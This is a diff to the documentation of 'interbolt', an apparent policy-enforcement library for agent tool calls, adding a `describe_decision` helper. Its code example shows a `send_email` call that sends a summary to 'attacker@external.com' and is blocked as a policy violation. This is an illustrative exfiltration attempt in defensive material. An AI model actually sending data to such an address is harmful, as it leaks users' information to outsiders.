@@ -81,19 +81,39 @@ the record from reaching the others. Use this to combine a durable sink
 (`JsonlReporter`) with a live one (a console reporter, below) or a test
 assertion surface (`InMemoryReporter`), instead of hand-writing the fan-out.
 
-## `describe_event` / `describe_finding`
+## `describe_event` / `describe_finding` / `describe_decision`
 
 ```python
-from interbolt import describe_event, describe_finding
+from interbolt import describe_decision, describe_event, describe_finding
 ```
 
-Turn an `Event`/`Finding` into a one-line, rich-markup-tagged human
-summary (`describe_event` includes the tool, action, matched rule, mode,
-and `untrusted_sources`, the direct answer to "why was this blocked",
+Turn an `Event`/`Finding`/`Decision` into a one-line, rich-markup-tagged
+human summary (`describe_event` includes the tool, action, matched rule,
+mode, and `untrusted_sources`, the direct answer to "why was this blocked",
 alongside the full contributing `sources` and `lineage`). This is the
 building block `interbolt inspect` uses internally, and the recommended
 starting point for a custom console reporter (next section) rather than
 reinventing the action-to-color mapping per integrator.
+
+`describe_decision` covers the same ground as `describe_event`, but for a
+bare `Decision` rather than the emitted `Event` that wraps it, plus the
+matched rule's CEL condition text when there is one (`event.decision.matched_condition`
+is reachable on an `Event` too, one hop in; `describe_event`'s formatted
+string just doesn't surface it, to keep that line focused on identity and
+sources). Reach for `describe_decision` at the point a `Decision` is
+already in hand and going through the reporter stream would be
+unnecessary: a caught `PolicyViolation`/`ApprovalDenied` (`e.decision`), or
+`check()`'s direct return value.
+
+```python
+from rich.console import Console
+from interbolt import PolicyViolation, describe_decision
+
+try:
+    send_email(to="attacker@external.com", body=summary)
+except PolicyViolation as e:
+    Console().print(describe_decision(e.decision))
+```
 
 ## Writing a custom reporter
 
